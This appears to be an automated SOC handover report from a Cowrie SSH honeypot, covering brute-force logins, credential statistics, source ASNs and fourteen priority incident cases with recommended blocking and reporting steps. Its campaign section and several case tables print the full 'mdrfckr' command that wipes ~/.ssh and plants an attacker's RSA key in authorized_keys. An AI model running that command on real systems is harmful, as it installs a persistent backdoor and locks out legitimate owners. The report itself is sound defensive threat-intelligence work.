# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-21 |
| **Generated At** | 2026-03-21T14:25:10Z |
| **Shift Time** | 14:25 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **74** |
| Confirmed Threats | **72** |
| False Positives Filtered | **2** (2.7%) |
| Unique Attacker IPs | **19** |
| Countries of Origin | **9** |
| High Severity Cases | **14** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **60** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **65** |
| Unique Credential Pairs | **55** |
| Unique Usernames | **47** |
| Unique Passwords | **37** |
| Successful Auth Pairs | **12** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 14 |
| `345gs5662d34` | 6 |
| `admin` | 1 |
| `wyy` | 1 |
| `mehedi` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 6 |
| `3245gs5662d34` | 6 |
| `12345` | 6 |
| `1234` | 5 |
| `12345678` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 6 |
| `root` | `3245gs5662d34` | 6 |
| `admin` | `admin7` | 1 |
| `wyy` | `wyypass` | 1 |
| `mehedi` | `mehedi1234` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Qq123456789.` | `14.103.102.130` | 2026-03-21T12:49:29 |
| `root` | `3245gs5662d34` | `14.103.102.130` | 2026-03-21T12:49:33 |
| `root` | `Asd123..` | `14.103.102.130` | 2026-03-21T12:51:01 |
| `root` | `newroot` | `218.87.21.146` | 2026-03-21T12:58:37 |
| `root` | `P@ssw0rd1234` | `157.15.59.120` | 2026-03-21T13:00:46 |
| `root` | `3245gs5662d34` | `157.15.59.120` | 2026-03-21T13:00:48 |
| `root` | `qazwsx123` | `49.43.32.40` | 2026-03-21T13:37:41 |
| `root` | `Admin666` | `120.62.8.17` | 2026-03-21T13:43:54 |
| `root` | `3245gs5662d34` | `120.62.8.17` | 2026-03-21T13:43:55 |
| `root` | `1220` | `101.36.106.113` | 2026-03-21T13:44:46 |
| `root` | `3245gs5662d34` | `101.36.106.113` | 2026-03-21T13:44:50 |
| `root` | `p-0p-0p-0` | `101.36.106.113` | 2026-03-21T13:52:39 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `157.15.59.120`, `14.103.102.130`, `120.62.8.17`, `101.36.106.113`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **19** |
| Unique ASNs | **18** |
| High-Risk ASNs | **16** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS152448` | Global Trading And IT Solution Pvt. Ltd. | 2 | HIGH |
| `AS55836` | Reliance Jio Infocomm Limited | 1 | HIGH |
| `AS24560` | Bharti Airtel Ltd., Telemedia Services | 1 | HIGH |
| `AS9829` | National Internet Backbone | 1 | HIGH |
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 1 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 1 | HIGH |
| `AS4811` | China Telecom (Group) | 1 | HIGH |
| `AS10030` | Celcom Axiata Berhad | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (14)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-5cdb778ebc4b

| Field | Detail |
|---|---|
| **Source IP** | `14.103.102[.]130` |
| **First Seen** | 2026-03-21 12:49 |
| **Last Seen** | 2026-03-21 12:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 12:49:28` | `cowrie.session.connect` |
| `2026-03-21 12:49:28` | `cowrie.client.version` |
| `2026-03-21 12:49:28` | `cowrie.client.kex` |
| `2026-03-21 12:49:29` | `cowrie.login.success` |
| `2026-03-21 12:49:29` | `cowrie.session.params` |
| `2026-03-21 12:49:29` | `cowrie.command.input` |
| `2026-03-21 12:49:29` | `cowrie.command.failed` |
| `2026-03-21 12:49:29` | `cowrie.log.closed` |
| `2026-03-21 12:49:30` | `cowrie.session.params` |
| `2026-03-21 12:49:30` | `cowrie.command.input` |
| `2026-03-21 12:49:30` | `cowrie.session.file_download` |
| `2026-03-21 12:49:30` | `cowrie.log.closed` |
| `2026-03-21 12:49:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.102[.]130` to AbuseIPDB if not already reported
- [ ] Block `14.103.102[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76b17f30610c

| Field | Detail |
|---|---|
| **Source IP** | `14.103.102[.]130` |
| **First Seen** | 2026-03-21 12:49 |
| **Last Seen** | 2026-03-21 12:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 12:49:32` | `cowrie.session.connect` |
| `2026-03-21 12:49:32` | `cowrie.client.version` |
| `2026-03-21 12:49:32` | `cowrie.client.kex` |
| `2026-03-21 12:49:33` | `cowrie.login.success` |
| `2026-03-21 12:49:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.102[.]130` to AbuseIPDB if not already reported
- [ ] Block `14.103.102[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64c7909e780a

| Field | Detail |
|---|---|
| **Source IP** | `14.103.102[.]130` |
| **First Seen** | 2026-03-21 12:51 |
| **Last Seen** | 2026-03-21 12:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 12:51:01` | `cowrie.session.connect` |
| `2026-03-21 12:51:01` | `cowrie.client.version` |
| `2026-03-21 12:51:01` | `cowrie.client.kex` |
| `2026-03-21 12:51:01` | `cowrie.login.success` |
| `2026-03-21 12:51:02` | `cowrie.session.params` |
| `2026-03-21 12:51:02` | `cowrie.command.input` |
| `2026-03-21 12:51:02` | `cowrie.command.failed` |
| `2026-03-21 12:51:02` | `cowrie.log.closed` |
| `2026-03-21 12:51:02` | `cowrie.session.params` |
| `2026-03-21 12:51:02` | `cowrie.command.input` |
| `2026-03-21 12:51:02` | `cowrie.session.file_download` |
| `2026-03-21 12:51:02` | `cowrie.log.closed` |
| `2026-03-21 12:51:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.102[.]130` to AbuseIPDB if not already reported
- [ ] Block `14.103.102[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02e6261ef975

| Field | Detail |
|---|---|
| **Source IP** | `14.103.102[.]130` |
| **First Seen** | 2026-03-21 12:51 |
| **Last Seen** | 2026-03-21 12:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 12:51:04` | `cowrie.session.connect` |
| `2026-03-21 12:51:04` | `cowrie.client.version` |
| `2026-03-21 12:51:04` | `cowrie.client.kex` |
| `2026-03-21 12:51:05` | `cowrie.login.success` |
| `2026-03-21 12:51:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.102[.]130` to AbuseIPDB if not already reported
- [ ] Block `14.103.102[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ab5a087c5fb

| Field | Detail |
|---|---|
| **Source IP** | `218.87.21[.]146` |
| **First Seen** | 2026-03-21 12:58 |
| **Last Seen** | 2026-03-21 12:58 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 12:58:34` | `cowrie.session.connect` |
| `2026-03-21 12:58:35` | `cowrie.client.version` |
| `2026-03-21 12:58:35` | `cowrie.client.kex` |
| `2026-03-21 12:58:37` | `cowrie.login.success` |
| `2026-03-21 12:58:38` | `cowrie.direct-tcpip.request` |
| `2026-03-21 12:58:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.87.21[.]146` to AbuseIPDB if not already reported
- [ ] Block `218.87.21[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4401c9d8d84

| Field | Detail |
|---|---|
| **Source IP** | `157.15.59[.]120` |
| **First Seen** | 2026-03-21 13:00 |
| **Last Seen** | 2026-03-21 13:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 13:00:46` | `cowrie.session.connect` |
| `2026-03-21 13:00:46` | `cowrie.client.version` |
| `2026-03-21 13:00:46` | `cowrie.client.kex` |
| `2026-03-21 13:00:46` | `cowrie.login.success` |
| `2026-03-21 13:00:46` | `cowrie.session.params` |
| `2026-03-21 13:00:46` | `cowrie.command.input` |
| `2026-03-21 13:00:46` | `cowrie.command.failed` |
| `2026-03-21 13:00:46` | `cowrie.log.closed` |
| `2026-03-21 13:00:46` | `cowrie.session.params` |
| `2026-03-21 13:00:46` | `cowrie.command.input` |
| `2026-03-21 13:00:46` | `cowrie.session.file_download` |
| `2026-03-21 13:00:46` | `cowrie.log.closed` |
| `2026-03-21 13:00:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.15.59[.]120` to AbuseIPDB if not already reported
- [ ] Block `157.15.59[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89d774561da9

| Field | Detail |
|---|---|
| **Source IP** | `157.15.59[.]120` |
| **First Seen** | 2026-03-21 13:00 |
| **Last Seen** | 2026-03-21 13:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 13:00:48` | `cowrie.session.connect` |
| `2026-03-21 13:00:48` | `cowrie.client.version` |
| `2026-03-21 13:00:48` | `cowrie.client.kex` |
| `2026-03-21 13:00:48` | `cowrie.login.success` |
| `2026-03-21 13:00:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.15.59[.]120` to AbuseIPDB if not already reported
- [ ] Block `157.15.59[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a269c0ba6fc4

| Field | Detail |
|---|---|
| **Source IP** | `49.43.32[.]40` |
| **First Seen** | 2026-03-21 13:37 |
| **Last Seen** | 2026-03-21 13:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 13:37:38` | `cowrie.session.connect` |
| `2026-03-21 13:37:39` | `cowrie.client.version` |
| `2026-03-21 13:37:39` | `cowrie.client.kex` |
| `2026-03-21 13:37:41` | `cowrie.login.success` |
| `2026-03-21 13:37:41` | `cowrie.direct-tcpip.request` |
| `2026-03-21 13:37:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.43.32[.]40` to AbuseIPDB if not already reported
- [ ] Block `49.43.32[.]40` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea9b63b87a9b

| Field | Detail |
|---|---|
| **Source IP** | `120.62.8[.]17` |
| **First Seen** | 2026-03-21 13:43 |
| **Last Seen** | 2026-03-21 13:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 13:43:53` | `cowrie.session.connect` |
| `2026-03-21 13:43:53` | `cowrie.client.version` |
| `2026-03-21 13:43:53` | `cowrie.client.kex` |
| `2026-03-21 13:43:54` | `cowrie.login.success` |
| `2026-03-21 13:43:54` | `cowrie.session.params` |
| `2026-03-21 13:43:54` | `cowrie.command.input` |
| `2026-03-21 13:43:54` | `cowrie.command.failed` |
| `2026-03-21 13:43:54` | `cowrie.log.closed` |
| `2026-03-21 13:43:54` | `cowrie.session.params` |
| `2026-03-21 13:43:54` | `cowrie.command.input` |
| `2026-03-21 13:43:54` | `cowrie.session.file_download` |
| `2026-03-21 13:43:54` | `cowrie.log.closed` |
| `2026-03-21 13:43:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.62.8[.]17` to AbuseIPDB if not already reported
- [ ] Block `120.62.8[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-345fcde6ac14

| Field | Detail |
|---|---|
| **Source IP** | `120.62.8[.]17` |
| **First Seen** | 2026-03-21 13:43 |
| **Last Seen** | 2026-03-21 13:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 13:43:55` | `cowrie.session.connect` |
| `2026-03-21 13:43:55` | `cowrie.client.version` |
| `2026-03-21 13:43:55` | `cowrie.client.kex` |
| `2026-03-21 13:43:55` | `cowrie.login.success` |
| `2026-03-21 13:43:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.62.8[.]17` to AbuseIPDB if not already reported
- [ ] Block `120.62.8[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9625fc3e097

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]113` |
| **First Seen** | 2026-03-21 13:44 |
| **Last Seen** | 2026-03-21 13:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 13:44:46` | `cowrie.session.connect` |
| `2026-03-21 13:44:46` | `cowrie.client.version` |
| `2026-03-21 13:44:46` | `cowrie.client.kex` |
| `2026-03-21 13:44:46` | `cowrie.login.success` |
| `2026-03-21 13:44:47` | `cowrie.session.params` |
| `2026-03-21 13:44:47` | `cowrie.command.input` |
| `2026-03-21 13:44:47` | `cowrie.command.failed` |
| `2026-03-21 13:44:47` | `cowrie.log.closed` |
| `2026-03-21 13:44:47` | `cowrie.session.params` |
| `2026-03-21 13:44:47` | `cowrie.command.input` |
| `2026-03-21 13:44:47` | `cowrie.session.file_download` |
| `2026-03-21 13:44:47` | `cowrie.log.closed` |
| `2026-03-21 13:44:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]113` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ee139810ff2

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]113` |
| **First Seen** | 2026-03-21 13:44 |
| **Last Seen** | 2026-03-21 13:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 13:44:49` | `cowrie.session.connect` |
| `2026-03-21 13:44:49` | `cowrie.client.version` |
| `2026-03-21 13:44:49` | `cowrie.client.kex` |
| `2026-03-21 13:44:50` | `cowrie.login.success` |
| `2026-03-21 13:44:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]113` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05801973e856

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]113` |
| **First Seen** | 2026-03-21 13:52 |
| **Last Seen** | 2026-03-21 13:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 13:52:39` | `cowrie.session.connect` |
| `2026-03-21 13:52:39` | `cowrie.client.version` |
| `2026-03-21 13:52:39` | `cowrie.client.kex` |
| `2026-03-21 13:52:39` | `cowrie.login.success` |
| `2026-03-21 13:52:40` | `cowrie.session.params` |
| `2026-03-21 13:52:40` | `cowrie.command.input` |
| `2026-03-21 13:52:40` | `cowrie.command.failed` |
| `2026-03-21 13:52:40` | `cowrie.log.closed` |
| `2026-03-21 13:52:40` | `cowrie.session.params` |
| `2026-03-21 13:52:40` | `cowrie.command.input` |
| `2026-03-21 13:52:40` | `cowrie.session.file_download` |
| `2026-03-21 13:52:40` | `cowrie.log.closed` |
| `2026-03-21 13:52:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]113` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9638ced01292

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]113` |
| **First Seen** | 2026-03-21 13:52 |
| **Last Seen** | 2026-03-21 13:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 13:52:42` | `cowrie.session.connect` |
| `2026-03-21 13:52:42` | `cowrie.client.version` |
| `2026-03-21 13:52:42` | `cowrie.client.kex` |
| `2026-03-21 13:52:43` | `cowrie.login.success` |
| `2026-03-21 13:52:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]113` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `101.36.106[.]113` | **15** | 2026-03-21 13:36 | 2026-03-21 14:04 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `120.62.8[.]17` | **15** | 2026-03-21 13:36 | 2026-03-21 13:49 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.102[.]130` | **9** | 2026-03-21 12:45 | 2026-03-21 12:51 | 4m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `157.15.59[.]120` | **8** | 2026-03-21 12:44 | 2026-03-21 13:03 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `115.190.107[.]24` | 1 | 2026-03-21 13:42 | 2026-03-21 13:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.198.138[.]185` | 1 | 2026-03-21 14:04 | 2026-03-21 14:04 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
